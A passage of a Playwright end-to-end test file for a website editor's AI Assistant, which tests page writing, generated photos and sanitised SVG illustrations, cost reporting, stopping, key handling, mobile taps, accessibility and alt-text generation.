  expect(photos[0]!.prompt).toBe("A bright gym floor at dawn, racks and free weights, seen from the door.\n\nA photograph for a web page. Never text in a picture: no words, letters, numbers, signs or logos. The page's words carry those. People in a picture, if any, are generic and unnamed: never a real person, a brand or a trademark.");
  // The key went to OpenAI with each, and in no body.
  for (const call of asked.filter((one) => one.url.endsWith("/v1/images/generations"))) {
    expect(call.headers.authorization).toBe(`Bearer ${OPENAI_KEY}`);
    expect(JSON.stringify(call.body)).not.toContain(OPENAI_KEY);
  }

  // Into the CMS's library, as uploads, named after the page and what each shows, with its alt text.
  const library = await libraryOf(request);
  const made = library.filter((item) => item.filename.startsWith("gym-") && item.filename.endsWith(".webp"));
  expect(made.map((item) => [item.filename, item.alt, item.contentType, item.width, item.height]).toSorted()).toEqual([
    ["gym-a-coach-beside-a-lifter.webp", "A coach beside a lifter", "image/webp", 192, 128],
    ["gym-rowers-by-the-window.webp", "Rowers by the window", "image/webp", 192, 128],
    ["gym-the-gym-floor-at-dawn.webp", "The gym floor at dawn", "image/webp", 192, 128],
  ]);

  // Onto the page: behind the opening, under its veil; above each card, its alt text said.
  const sections = pageSections(page);
  const opening = sections.first();
  await expect(opening.locator(":scope > picture.sw-picture > img")).toHaveJSProperty("complete", true);
  expect(await opening.locator(":scope > picture.sw-picture > img").evaluate((img: HTMLImageElement) => img.naturalWidth)).toBe(192);
  await expect(opening).toHaveAttribute("data-veil", "dark");
  const cards = sections.nth(1).locator("[data-block-type='column']");
  await expect(cards.nth(0).locator(":scope > [data-block-type]").first()).toHaveAttribute("data-block-type", "image");
  await expect(page.locator(".canvas").getByRole("img", { name: "A coach beside a lifter" })).toBeVisible();
  await expect(page.locator(".canvas").getByRole("img", { name: "Rowers by the window" })).toBeVisible();

  // After: the page's words, a line for the photos, the whole; the total counts them.
  await expect(box.locator(".as-cost")).toHaveText("Under $0.01 ($0.0048) at gpt-5's list price ($1.25 in, $0.125 cached, $1.25 written to the cache, $10 out per million tokens; prices of 20 Oct 2026).");
  // Each 50 × $5 + 160 × $30 a million tokens.
  await expect(box.locator(".as-pictures-cost")).toHaveText("3 photos, ≈ $0.015: 150 tokens in and 480 out, at gpt-image-2's list price ($5 in, $30 out per million tokens).");
  await expect(box.locator(".as-all")).toHaveText("In all, ≈ $0.02 for the page and its pictures.");
  await expect(box.locator(".as-total")).toHaveText("Since you connected this key: 1 request and 3 photos, 1,050 tokens in, 300 of them cached and 200 written to the cache, and 880 out, ≈ $0.02.");

  // Each a step of the Assistant's, undone on its own: the section stays.
  const history = await drawer(page, "History");
  const steps = await history.locator(".hist-what").allTextContents();
  expect(steps.filter((step) => /picture|Image/.test(step)).toSorted()).toEqual(["Assistant added Image to Column 1 in Classes", "Assistant added Image to Column 2 in Classes", "Assistant set a picture behind Opening"]);
  const pictures = page.locator(".canvas :is(picture.sw-picture, [data-block-type='image']) img");
  await expect(pictures).toHaveCount(3);
  await page.locator(".topbar").getByRole("button", { name: "Undo" }).click();
  await expect(history.locator("li.hist-undone .hist-what")).toHaveText([steps[0]!]);
  await expect(pictures).toHaveCount(2);
  await expect(sections).toHaveCount(2);
});

test("Anthropic: illustrations drawn by the model in the site's colours, cleaned, then drawn to WebP; one with a script in it is refused, and its card stays as it was, said", async ({ page, request }) => {
  const plan = JSON.stringify({
    title: "Rowing club",
    description: "",
    sections: [
      { label: "Opening", anchor: "", background: "text", motion: "none", widths: "equal",
        picture: { source: "made", prompt: "A rower on calm water at dawn.", alt: "A rower at dawn", shape: "landscape", veil: "dark", strength: "strong", focus: "center" },
        columns: [{ align: "left", blocks: [{ kind: "heading", level: 1, text: "Row with us", display: true }] }] },
      { label: "Prizes", anchor: "", background: "none", motion: "none", widths: "equal", picture: { source: "none" }, columns: [
        { align: "left", blocks: [{ kind: "image", source: "made", prompt: "A trophy on a shelf.", alt: "A trophy", shape: "square" }] },
        { align: "left", blocks: [{ kind: "heading", level: 2, text: "Our prizes", display: false }] },
      ] },
    ],
  });
  const asked = await anthropic(page, ANTHROPIC_KEY, plan);
  await startOn(page, request, "Before the illustrations");
  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  await expect(box.getByRole("switch", { name: "Draw illustrations for the page" })).toBeChecked();
  await expect(box.getByRole("radiogroup", { name: "Photo quality" })).toHaveCount(0);
  await box.getByLabel("What is the page for?").fill("A rowing club's page.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "2 sections and 1 illustration on “Rowing club”" })).toBeVisible({ timeout: 30_000 });
  await expect(box.getByRole("listitem")).toHaveText(["Opening", /^Illustration behind Opening, in, /, "Prizes", "Illustration in Prizes, left out"]);
  await box.getByText("One thing was left out").click();
  await expect(box.getByText("Left out the illustration for an image in the section “Prizes”: it was not clean: it holds a script element, which an illustration here may not hold.")).toBeVisible();

  // Each asked of the model chosen, in the site's palette, as one SVG in its schema.
  const drawings = asked.filter((call) => call.url.endsWith("/v1/messages") && JSON.stringify(call.body).includes("\"required\":[\"svg\"]")).map((call) => call.body as { model: string; system: unknown });
  expect(drawings).toHaveLength(2);
  expect(drawings.map((body) => body.model)).toEqual(["claude-opus-5-5", "claude-opus-5-5"]);
  expect(systemText(drawings[0]!.system)).toMatch(/Its colours are the site's palette, as hex, and white or black where needed: text #[0-9a-f]{6}, background #[0-9a-f]{6}, primary #/i);

  // Drawn at the shape's size and kept as a WebP, with its alt text; the refused one never reached the library.
  const drawn = (await libraryOf(request)).filter((item) => item.filename.startsWith("rowing-club-"));
  expect(drawn.map((item) => [item.filename, item.alt, item.contentType, item.width, item.height])).toEqual([["rowing-club-a-rower-at-dawn.webp", "A rower at dawn", "image/webp", 1536, 1024]]);
  const opening = pageSections(page).first().locator(":scope > picture.sw-picture > img");
  await expect(opening).toHaveJSProperty("complete", true);
  expect(await opening.evaluate((img: HTMLImageElement) => [img.naturalWidth, img.naturalHeight])).toEqual([1536, 1024]);
  // The card as it went in: its column there, empty, and nothing broken.
  const prizes = pageSections(page).nth(1).locator("[data-block-type='column']");
  await expect(prizes).toHaveCount(2);
  await expect(prizes.nth(0).locator("[data-block-type='image']")).toHaveCount(0);
  // Both drawings cost their tokens, the refused one too.
  await expect(box.locator(".as-pictures-cost")).toHaveText(/^2 illustrations, ≈ \$[0-9.]+: 2,468 tokens in and 1,134 out, at Claude Opus 5\.5's list price \(\$4 in, \$20 out per million tokens\)\.$/);
  await expect(box.locator(".as-total")).toHaveText(/^Since you connected this key: 1 request and 2 illustrations, /);
});

test("Stop stops the photos still being made: nothing more lands, and the drawer says so", async ({ page, request }) => {
  await startOn(page, request, "Before a stop");
  let answer: () => void = () => undefined;
  const asked = await openai(page, { plan: MADE_PLAN, photo: await webp(page), hold: new Promise((done) => (answer = done)) });
  const box = await assistant(page);
  await box.getByRole("radio", { name: "OpenAI" }).click();
  await box.getByLabel("Your OpenAI key").fill(OPENAI_KEY);
  await box.getByRole("button", { name: "Connect OpenAI" }).click();
  await expect(box.getByText("key …c3d4")).toBeVisible();
  await box.getByLabel("What is the page for?").fill("A gym.");
  await box.getByRole("button", { name: "Write the page" }).click();
  // The sections are in; two photos are being made, the third waits.
  await expect(box.getByRole("heading", { name: "Making pictures" })).toBeVisible({ timeout: 30_000 });
  await expect(box.locator(".as-picture-making")).toHaveCount(2);
  await box.getByRole("button", { name: "Stop" }).click();
  await expect(box.getByRole("heading", { name: "Stopped" })).toBeVisible();
  answer();
  await expect(box.locator(".as-picture")).toHaveText([/stopped$/, /stopped$/, /stopped$/]);
  await expect(pageSections(page).first().locator(":scope > picture.sw-picture")).toHaveCount(0);
  await expect(page.locator(".canvas [data-block-type='image']")).toHaveCount(0);
  // The third was never asked for.
  expect(asked.filter((call) => call.url.endsWith("/v1/images/generations"))).toHaveLength(2);
  const history = await drawer(page, "History");
  await expect(history.locator(".hist-what")).toHaveText(["Assistant added section Classes", "Assistant added section Opening", "Assistant changed the page description"]);
});

test("another page opened while photos are made: those in flight stop, the rest are never asked, nothing lands on the page left, and the drawer says what was not made", async ({ page, request }) => {
  await startOn(page, request, "Before a leave");
  const asked = await openai(page, { plan: MADE_PLAN, photo: await webp(page), hold: new Promise(() => undefined) });
  const box = await assistant(page);
  await box.getByRole("radio", { name: "OpenAI" }).click();
  await box.getByLabel("Your OpenAI key").fill(OPENAI_KEY);
  await box.getByRole("button", { name: "Connect OpenAI" }).click();
  await expect(box.getByText("key …c3d4")).toBeVisible();
  await box.getByLabel("What is the page for?").fill("A gym.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.locator(".as-picture-making")).toHaveCount(2, { timeout: 30_000 });
  const written = Number(new URL(page.url()).searchParams.get("page"));
  // The person opens the page they started on.
  await page.getByRole("button", { name: /^Switch page\. Open:/ }).click();
  await page.getByRole("dialog", { name: "Pages" }).getByRole("button", { name: /^Before a leave/ }).first().click();
  await expect(page.getByRole("button", { name: /^Switch page\. Open: Before a leave/ })).toBeVisible();
  await expect(box.getByRole("heading", { name: "Not written" })).toBeVisible({ timeout: 10_000 });
  await expect(box.getByRole("status")).toHaveText("Another page was opened: the Assistant stopped writing to this one.");
  await expect(box.locator(".as-picture")).toHaveText([/stopped$/, /stopped$/, /stopped$/]);
  await box.getByText(/things? (was|were) left out/).click();
  await expect(box.getByText("Did not make 3 pictures still to come: another page was opened.")).toBeVisible();
  // Two were asked, while the page was being written; none after.
  expect(asked.filter((call) => call.url.endsWith("/v1/images/generations"))).toHaveLength(2);
  const draft = await draftOf(request, written);
  expect(JSON.stringify(draft.document)).not.toContain("mediaId");
});

test("Forget key while illustrations are drawn: those in flight stop, none is asked with the key connected next, and its total is untouched", async ({ page, request }) => {
  const illustrated = JSON.stringify({
    title: "Rowing club",
    description: "",
    sections: [
      { label: "Opening", anchor: "", background: "text", motion: "none", widths: "equal",
        picture: { source: "made", prompt: "A rower on calm water at dawn.", alt: "A rower at dawn", shape: "landscape", veil: "dark", strength: "strong", focus: "center" },
        columns: [{ align: "left", blocks: [{ kind: "heading", level: 1, text: "Row with us", display: true }] }] },
      { label: "Ways", anchor: "", background: "none", motion: "none", widths: "equal", picture: { source: "none" }, columns: [
        { align: "left", blocks: [{ kind: "image", source: "made", prompt: "A boat on the water.", alt: "A boat", shape: "square" }] },
        { align: "left", blocks: [{ kind: "image", source: "made", prompt: "A lighthouse on a headland.", alt: "A lighthouse", shape: "square" }] },
        { align: "left", blocks: [{ kind: "image", source: "made", prompt: "A sun over the sea.", alt: "The sun", shape: "square" }] },
      ] },
    ],
  });
  const drawn = await anthropic(page, ANTHROPIC_KEY, illustrated, new Promise(() => undefined));
  const other = await openai(page);
  await startOn(page, request, "Before a forgotten key");
  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  await box.getByLabel("What is the page for?").fill("A rowing club.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.locator(".as-picture-making")).toHaveCount(2, { timeout: 30_000 });
  // The key forgotten, another provider's connected, while two are being drawn.
  await box.getByRole("button", { name: "Forget key" }).click();
  await box.getByRole("radio", { name: "OpenAI" }).click();
  await box.getByLabel("Your OpenAI key").fill(OPENAI_KEY);
  await box.getByRole("button", { name: "Connect OpenAI" }).click();
  await expect(box.getByText("key …c3d4")).toBeVisible();
  await expect(box.getByRole("heading", { name: "Written" })).toBeVisible({ timeout: 10_000 });
  await expect(box.locator(".as-picture")).toHaveText([/stopped$/, /stopped$/, /stopped$/, /stopped$/]);
  await box.getByText(/things? (was|were) left out/).click();
  await expect(box.getByText("Did not make 4 pictures still to come: the key they were to be made with is no longer kept.")).toBeVisible();
  // Two drawings asked of Anthropic with its key, none after; nothing of OpenAI's but its models.
  const drawings = drawn.filter((call) => call.url.endsWith("/v1/messages") && JSON.stringify(call.body).includes("\"required\":[\"svg\"]"));
  expect(drawings).toHaveLength(2);
  for (const call of drawings) expect(call.headers["x-api-key"]).toBe(ANTHROPIC_KEY);
  expect(other.map((call) => new URL(call.url).pathname)).toEqual(["/v1/models", "/v1/models"]);
  // The new key's total holds nothing of the run's.
  await expect(page.locator(".as-total")).toHaveCount(0);
});

test.describe("a refused key", () => {
  // The browser's own line for the provider's 401, which the test asks for.
  test.use({ allowConsole: /status of 401/ });

  test("a key its provider refuses is said and not kept; Forget key forgets one kept", async ({ page, request }) => {
  await anthropic(page);
  await startOn(page, request, "Keys");
  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill("sk-ant-wrong");
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("Anthropic did not accept this key. Check it was copied whole, or make a new one.")).toBeVisible();
  await expect(box.getByLabel("Your Anthropic key")).toHaveAttribute("aria-invalid", "true");
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await box.getByRole("button", { name: "Forget key" }).click();
  await expect(box.getByLabel("Your Anthropic key")).toBeVisible();
  await expect(box.getByLabel("Your Anthropic key")).toHaveValue("");
  });
});

test("with no key, the sample written by hand builds its page the same way, section by section", async ({ page, request }) => {
  await startOn(page, request, "Before the sample");
  const box = await assistant(page);
  await box.getByRole("button", { name: "Build the sample page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "4 sections on “Open day”" })).toBeVisible({ timeout: 20_000 });
  await expect(box.getByText("A sample written by hand: no model was asked.")).toBeVisible();
  await expect(pageSections(page)).toHaveCount(4);
});

// On a phone, the keyboard up while the brief is written takes the bar's
// room, and the sheet stands on it. The first tap on Write the page must
// land: the sheet must not move from under the finger when the field lets
// go of the focus, as it once did, by the bar's height, and the tap missed.
test.describe("in a phone's window, 390 by 844, with a finger", () => {
  test.use({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });

  test("the first tap on Write the page, the brief's field focused, writes the page; the bar comes back after it", async ({ page, request }) => {
    await anthropic(page);
    await startOn(page, request, "Phone brief");
    const bar = page.getByRole("navigation", { name: "Editor tools" });
    await bar.getByRole("button", { name: "More", exact: true }).tap();
    await page.getByRole("dialog", { name: "More" }).getByRole("button", { name: "Assistant" }).tap();
    const box = page.getByRole("complementary", { name: "Assistant", exact: true });
    await expect(box).toBeVisible();
    await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
    await box.getByLabel("Your Anthropic key").press("Enter");
    await expect(box.getByText("key …a1b2")).toBeVisible();

    // Writing the brief: the field has the focus, and the bar gives the
    // keyboard its room.
    const brief = box.getByLabel("What is the page for?");
    await brief.tap();
    await brief.fill("An open day at the club on Saturday 12 April, from 8 to 11.");
    await expect(brief).toBeFocused();
    await expect(bar).toBeHidden();
    const write = box.getByRole("button", { name: "Write the page" });
    await write.scrollIntoViewIfNeeded();
    const before = (await write.boundingBox())!;

    // One tap, where the key is.
    await page.touchscreen.tap(before.x + before.width / 2, before.y + before.height / 2);
    await expect(box.getByRole("status").filter({ hasText: "3 sections on “Open day”" })).toBeVisible({ timeout: 10_000 });
    await expect(bar).toBeVisible();
  });
});

test("the Assistant's drawer passes axe, asking for a key, with one kept, and after a page, with what it used and the total", async ({ page, request }) => {
  await anthropic(page);
  await startOn(page, request, "Axe");
  const box = await assistant(page);
  expect((await axe(page, { include: ".drawer-assistant" })).serious).toEqual([]);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  expect((await axe(page, { include: ".drawer-assistant" })).serious).toEqual([]);
  await box.getByLabel("What is the page for?").fill("An open day at the club.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.locator(".as-total")).toBeVisible();
  expect((await axe(page, { include: ".drawer-assistant" })).serious).toEqual([]);
});

async function connected(page: Page) {
  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  await box.getByRole("button", { name: "Close Assistant" }).click();
}

test("a heading written again is shown first, then taken as one step of the Assistant's; with no key, the panel says where one is connected", async ({ page, request }) => {
  await anthropic(page);
  await startOn(page, request, "Rewrite");
  await block(page, "h1").click();
  const tool = page.getByRole("region", { name: "Write it again" });
  await expect(tool.getByRole("button", { name: "Assistant" })).toBeVisible();
  await connected(page);
  await block(page, "h1").click();
  await tool.getByRole("button", { name: "Shorter" }).click();
  await expect(tool.getByLabel("The heading written again")).toHaveText("Swim at first light");
  await expect(tool.locator(".as-spent")).toHaveText("Used 1,234 tokens in and 567 out, on your key: ≈ $0.016 at Claude Opus 5.5's list price.");
  // Nothing has changed yet.
  await expect(block(page, "h1").getByRole("heading")).toHaveText("Start");
  await tool.getByRole("button", { name: "Use it" }).click();
  await expect(block(page, "h1").getByRole("heading")).toHaveText("Swim at first light");
  // The drawer's total holds it.
  await expect((await assistant(page)).locator(".as-total")).toHaveText("Since you connected this key: 1 request, 1,234 tokens in and 567 out, ≈ $0.016.");
  const history = await drawer(page, "History");
  await expect(history.locator(".hist-what").first()).toHaveText(/^Assistant changed/);
});

test("an image of the library is described from the picture itself, shown first, then taken as its alt text", async ({ page, request }) => {
  const asked = await anthropic(page);
  await startOn(page, request, "Describe");
  await connected(page);
  await block(page, "h1").click();
  await drawer(page, "Insert");
  await page.getByRole("group", { name: "Basic" }).getByRole("button", { name: "Image" }).click();
  const library = page.getByRole("dialog", { name: "Media library" });
  const name = `${unique("halves")}.png`;
  await library.getByLabel("Images to upload").setInputFiles({ name, mimeType: "image/png", buffer: png(64, 48, (x) => (x < 32 ? [30, 110, 90] : [230, 200, 140])) });
  await expect(library.getByRole("radio", { name: `${name}, no alt text` })).toHaveAttribute("aria-checked", "true", { timeout: 30_000 });
  await library.getByRole("textbox", { name: /^Alt text/ }).fill("Two colours");
  await library.getByRole("button", { name: "Add image" }).click();
  await expect(library).toHaveCount(0);

  const tool = page.getByRole("region", { name: "Describe the image" });
  await tool.getByRole("button", { name: "Write its alt text" }).click();
  await expect(tool.getByLabel("The alt text proposed")).toHaveText("A small green and sand picture, split down the middle");
  await tool.getByRole("button", { name: "Use it" }).click();
  await expect(page.locator(".canvas").getByRole("img", { name: "A small green and sand picture, split down the middle" })).toBeVisible();

  // The picture went with the question, made into a JPEG, with the words beside it.
  const question = asked.filter((call) => call.url.endsWith("/v1/messages")).at(-1)!.body as { messages: Array<{ content: Array<{ type: string; source?: { media_type: string; data: string }; text?: string }> }> };
  const parts = question.messages[0]!.content;
  expect(parts[0]).toMatchObject({ type: "image", source: { media_type: "image/jpeg" } });
  expect(parts[0]!.source!.data.length).toBeGreaterThan(100);
  expect(parts[1]!.text).toContain("Next to the image: Start");
});
